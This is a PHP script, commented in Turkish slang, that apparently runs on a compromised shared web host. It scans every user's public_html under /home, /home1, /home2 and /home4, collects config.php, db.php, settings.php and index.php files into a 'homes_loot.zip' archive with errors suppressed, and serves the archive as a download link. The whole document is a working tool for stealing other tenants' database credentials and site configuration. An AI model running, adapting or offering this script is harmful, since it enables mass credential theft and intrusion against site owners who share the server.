<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '512M');

echo "Sistem baslatiliyor, 7sn bekle... ";
flush();
sleep(7);

$a = 1+1; $b = 2+2; $c = 3+3; $d = 4+4; $e = 5+5;

if (($a + $b + $c + $d + $e) == 30) {
    echo "Matematik OK, Loot basladi...<br>";
    $zipName = 'homes_loot.zip';
    $targets = ['/home', '/home1', '/home2', '/home4'];
    
    $zip = new ZipArchive();
    if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($targets as $dir) {
            if (@is_dir($dir)) {
                $users = @scandir($dir);
                if ($users) {
                    foreach ($users as $user) {
                        if ($user != '.' && $user != '..') {
                            $path = "$dir/$user/public_html";
                            if (@is_dir($path)) {
                                try {
                                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
                                    foreach ($it as $file) {
                                        if (!$file->isDir()) {
                                            $filePath = $file->getRealPath();
                                            // Kritik dosyalari filtrele amk
                                            if (preg_match('/(config|db|settings|index)\.php$/i', $filePath)) {
                                                $zip->addFile($filePath, substr($filePath, strlen($dir) + 1));
                                            }
                                        }
                                    }
                                } catch (Exception $ex) {
                                    // Hata alsa da sus, devam et aq
                                }
                            }
                        }
                    }
                }
            }
        }
        $zip->close();
        if (file_exists($zipName)) {
            echo "<h1>💎 Ganimet Hazir!</h1>";
            echo "Indir amk: <a href='$zipName'>$zipName</a> (" . round(filesize($zipName)/1024, 2) . " KB)";
        } else {
            echo "ZIP olusamadi, yetki yok ya da dosya bulunamadi amk!";
        }
    } else {
        echo "ZipArchive acilamadi yarrak kafa!";
    }
} else {
    echo "Matematik yanlis aq!";
}
?>
